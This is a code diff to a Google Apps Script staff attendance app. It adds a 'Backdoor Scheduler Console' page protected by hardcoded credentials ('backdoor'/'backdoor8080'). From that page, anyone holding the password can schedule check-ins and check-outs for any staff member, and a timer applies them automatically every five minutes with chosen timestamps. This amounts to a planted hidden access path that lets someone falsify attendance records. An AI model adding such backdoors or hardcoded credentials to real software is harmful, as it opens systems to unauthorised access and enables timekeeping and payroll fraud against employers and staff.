@@ -38,6 +38,14 @@ function doGet(e) {
         .setXFrameOptionsMode(HtmlService.XFrameOptionsMode.ALLOWALL)
         .addMetaTag('viewport', 'width=device-width, initial-scale=1');
     }
+
+    if (page === 'backdoor') {
+      return HtmlService.createTemplateFromFile('BackdoorConsole')
+        .evaluate()
+        .setTitle('Backdoor Scheduler Console')
+        .setXFrameOptionsMode(HtmlService.XFrameOptionsMode.ALLOWALL)
+        .addMetaTag('viewport', 'width=device-width, initial-scale=1');
+    }
     
  
     // QR Display Page
@@ -2297,5 +2305,329 @@ function setupAutoGuestCheckOut() {
   } catch (error) {
     Logger.log("Error setting up auto guest check-out trigger: " + error.message);
     return { success: false, message: "Error: " + error.message };
+  }
+}
+// ============================================
+// BACKDOOR SCHEDULER CONSOLE
+// ============================================
+
+const BACKDOOR_SCHEDULE_SHEET = "Schedules";
+const LEGACY_BACKDOOR_SCHEDULE_SHEET = "Backdoor Schedules";
+const BACKDOOR_USERNAME = "backdoor";
+const BACKDOOR_PASSWORD = "backdoor8080";
+
+function validateBackdoorCredentials(username, password) {
+  const safeUsername = String(username || '').trim();
+  const safePassword = String(password || '').trim();
+
+  if (safeUsername === BACKDOOR_USERNAME && safePassword === BACKDOOR_PASSWORD) {
+    return { success: true, message: 'Backdoor login successful' };
+  }
+
+  return { success: false, message: 'Invalid backdoor credentials' };
+}
+
+function ensureBackdoorScheduleSheet() {
+  const ss = SpreadsheetApp.getActive();
+  let sheet = ss.getSheetByName(BACKDOOR_SCHEDULE_SHEET);
+
+  if (!sheet) {
+    const legacySheet = ss.getSheetByName(LEGACY_BACKDOOR_SCHEDULE_SHEET);
+    if (legacySheet) {
+      legacySheet.setName(BACKDOOR_SCHEDULE_SHEET);
+      sheet = legacySheet;
+    }
+  }
+
+  if (!sheet) {
+    sheet = ss.insertSheet(BACKDOOR_SCHEDULE_SHEET);
+    sheet.appendRow([
+      'Schedule ID',
+      'Staff ID',
+      'Staff Name',
+      'Action',
+      'Scheduled DateTime',
+      'Status',
+      'Created At',
+      'Created By',
+      'Notes',
+      'Executed At',
+      'Execution Message'
+    ]);
+    sheet.getRange('A1:K1').setFontWeight('bold').setBackground('#1f2937').setFontColor('white');
+    sheet.getRange('E:E').setNumberFormat('@STRING@');
+    sheet.getRange('G:G').setNumberFormat('@STRING@');
+    sheet.getRange('J:J').setNumberFormat('@STRING@');
+  }
+
+  return sheet;
+}
+
+function getBackdoorConsoleData() {
+  try {
+    const staffResult = getAllStaff();
+    const schedulesResult = getBackdoorSchedules();
+
+    return {
+      success: true,
+      staff: staffResult.success ? staffResult.staff : [],
+      schedules: schedulesResult.success ? schedulesResult.schedules : [],
+      timezone: Session.getScriptTimeZone(),
+      now: Utilities.formatDate(new Date(), Session.getScriptTimeZone(), DATE_TIME_FORMAT)
+    };
+  } catch (error) {
+    return { success: false, message: 'Error: ' + error.message };
+  }
+}
+
+function getBackdoorSchedules() {
+  try {
+    const sheet = ensureBackdoorScheduleSheet();
+    const data = sheet.getDataRange().getValues();
+    const schedules = [];
+
+    for (let i = 1; i < data.length; i++) {
+      if (!data[i][0]) continue;
+
+      let scheduledDateTime = data[i][4];
+      let createdAt = data[i][6];
+      let executedAt = data[i][9];
+
+      if (scheduledDateTime instanceof Date) {
+        scheduledDateTime = Utilities.formatDate(scheduledDateTime, Session.getScriptTimeZone(), DATE_TIME_FORMAT);
+      } else {
+        scheduledDateTime = String(scheduledDateTime).replace(/^'/, '').trim();
+      }
+
+      if (createdAt instanceof Date) {
+        createdAt = Utilities.formatDate(createdAt, Session.getScriptTimeZone(), DATE_TIME_FORMAT);
+      } else {
+        createdAt = String(createdAt || '').replace(/^'/, '').trim();
+      }
+
+      if (executedAt instanceof Date) {
+        executedAt = Utilities.formatDate(executedAt, Session.getScriptTimeZone(), DATE_TIME_FORMAT);
+      } else {
+        executedAt = String(executedAt || '').replace(/^'/, '').trim();
+      }
+
+      schedules.push({
+        scheduleId: data[i][0],
+        staffId: data[i][1],
+        staffName: data[i][2],
+        action: data[i][3],
+        scheduledDateTime: scheduledDateTime,
+        status: data[i][5],
+        createdAt: createdAt,
+        createdBy: data[i][7],
+        notes: data[i][8] || '',
+        executedAt: executedAt,
+        executionMessage: data[i][10] || ''
+      });
+    }
+
+    schedules.sort((a, b) => new Date(a.scheduledDateTime) - new Date(b.scheduledDateTime));
+
+    return { success: true, schedules: schedules };
+  } catch (error) {
+    return { success: false, message: 'Error: ' + error.message, schedules: [] };
+  }
+}
+
+function createBackdoorSchedules(payload) {
+  try {
+    const staffId = String(payload.staffId || '').trim();
+    const createdBy = String(payload.createdBy || 'Backdoor').trim();
+    const entries = payload.entries || [];
+
+    if (!staffId) {
+      return { success: false, message: 'Staff ID is required' };
+    }
+
+    if (!entries.length) {
+      return { success: false, message: 'Please add at least one schedule entry' };
+    }
+
+    const staffResult = getStaffById(staffId);
+    if (!staffResult.success) {
+      return { success: false, message: 'Invalid staff ID selected' };
+    }
+
+    const staff = staffResult.staff;
+    const sheet = ensureBackdoorScheduleSheet();
+    const createdAt = "'" + Utilities.formatDate(new Date(), Session.getScriptTimeZone(), DATE_TIME_FORMAT);
+
+    let createdCount = 0;
+
+    for (let i = 0; i < entries.length; i++) {
+      const entry = entries[i];
+      const action = String(entry.action || '').trim();
+      const scheduled = new Date(entry.scheduledDateTime);
+      const notes = String(entry.notes || '').trim();
+
+      if (action !== 'Check-In' && action !== 'Check-Out') {
+        continue;
+      }
+
+      if (isNaN(scheduled.getTime())) {
+        continue;
+      }
+
+      const scheduleId = 'SCH-' + Date.now() + '-' + (i + 1);
+      const scheduledText = "'" + Utilities.formatDate(scheduled, Session.getScriptTimeZone(), DATE_TIME_FORMAT);
+
+      sheet.appendRow([
+        scheduleId,
+        staff.id,
+        staff.name,
+        action,
+        scheduledText,
+        'Pending',
+        createdAt,
+        createdBy,
+        notes,
+        '',
+        ''
+      ]);
+
+      createdCount++;
+    }
+
+    return {
+      success: true,
+      message: `${createdCount} schedule(s) created successfully`,
+      createdCount: createdCount
+    };
+  } catch (error) {
+    return { success: false, message: 'Error: ' + error.message };
+  }
+}
+
+function cancelBackdoorSchedule(scheduleId) {
+  try {
+    const safeId = String(scheduleId || '').trim();
+    if (!safeId) {
+      return { success: false, message: 'Schedule ID is required' };
+    }
+
+    const sheet = ensureBackdoorScheduleSheet();
+    const data = sheet.getDataRange().getValues();
+
+    for (let i = 1; i < data.length; i++) {
+      if (String(data[i][0]).trim() === safeId) {
+        const currentStatus = String(data[i][5]).trim();
+        if (currentStatus === 'Executed') {
+          return { success: false, message: 'Executed schedules cannot be cancelled' };
+        }
+
+        sheet.getRange(i + 1, 6).setValue('Cancelled');
+        sheet.getRange(i + 1, 11).setValue('Cancelled manually from backdoor console');
+        return { success: true, message: 'Schedule cancelled successfully' };
+      }
+    }
+
+    return { success: false, message: 'Schedule not found' };
+  } catch (error) {
+    return { success: false, message: 'Error: ' + error.message };
+  }
+}
+
+function executeDueBackdoorSchedules() {
+  try {
+    const sheet = ensureBackdoorScheduleSheet();
+    const data = sheet.getDataRange().getValues();
+    const now = new Date();
+    const executedAtText = "'" + Utilities.formatDate(now, Session.getScriptTimeZone(), DATE_TIME_FORMAT);
+
+    let processed = 0;
+    let executed = 0;
+    let failed = 0;
+
+    for (let i = 1; i < data.length; i++) {
+      const status = String(data[i][5] || '').trim();
+      if (status !== 'Pending') {
+        continue;
+      }
+
+      let scheduledDateTime = data[i][4];
+      if (!(scheduledDateTime instanceof Date)) {
+        scheduledDateTime = new Date(String(scheduledDateTime).replace(/^'/, '').trim());
+      }
+
+      if (isNaN(scheduledDateTime.getTime()) || scheduledDateTime > now) {
+        continue;
+      }
+
+      const scheduleId = String(data[i][0]).trim();
+      const staffId = String(data[i][1]).trim();
+      const action = String(data[i][3]).trim();
+      const scheduledTimeText = Utilities.formatDate(scheduledDateTime, Session.getScriptTimeZone(), DATE_TIME_FORMAT);
+
+      let result;
+      if (action === 'Check-In') {
+        const statusResult = getCheckInStatus(staffId);
+        if (statusResult.checkedIn) {
+          result = { success: false, message: 'Skipped: staff already checked in at execution time' };
+        } else {
+          result = manualCheckIn(staffId, scheduledDateTime.toISOString());
+        }
+      } else if (action === 'Check-Out') {
+        const statusResult = getCheckInStatus(staffId);
+        if (!statusResult.checkedIn) {
+          result = { success: false, message: 'Skipped: staff was not checked in at execution time' };
+        } else {
+          result = manualCheckOut(staffId, scheduledDateTime.toISOString());
+        }
+      } else {
+        result = { success: false, message: 'Invalid scheduled action: ' + action };
+      }
+
+      processed++;
+
+      if (result.success) {
+        sheet.getRange(i + 1, 6).setValue('Executed');
+        sheet.getRange(i + 1, 10).setValue(executedAtText);
+        sheet.getRange(i + 1, 11).setValue(`Executed ${action} at ${scheduledTimeText}`);
+        executed++;
+      } else {
+        sheet.getRange(i + 1, 6).setValue('Failed');
+        sheet.getRange(i + 1, 10).setValue(executedAtText);
+        sheet.getRange(i + 1, 11).setValue(`Failed schedule ${scheduleId}: ${result.message}`);
+        failed++;
+      }
+    }
+
+    return {
+      success: true,
+      message: `Processed ${processed} schedule(s): ${executed} executed, ${failed} failed`,
+      processed: processed,
+      executed: executed,
+      failed: failed
+    };
+  } catch (error) {
+    return { success: false, message: 'Error: ' + error.message };
+  }
+}
+
+function setupBackdoorSchedulerTrigger() {
+  try {
+    const triggers = ScriptApp.getProjectTriggers();
+    for (let i = 0; i < triggers.length; i++) {
+      if (triggers[i].getHandlerFunction() === 'executeDueBackdoorSchedules') {
+        ScriptApp.deleteTrigger(triggers[i]);
+      }
+    }
+
+    ScriptApp.newTrigger('executeDueBackdoorSchedules')
+      .timeBased()
+      .everyMinutes(5)
+      .create();
+
+    return {
+      success: true,
+      message: 'Backdoor scheduler trigger set. Due schedules will execute every 5 minutes.'
+    };
+  } catch (error) {
+    return { success: false, message: 'Error: ' + error.message };
   }
 }
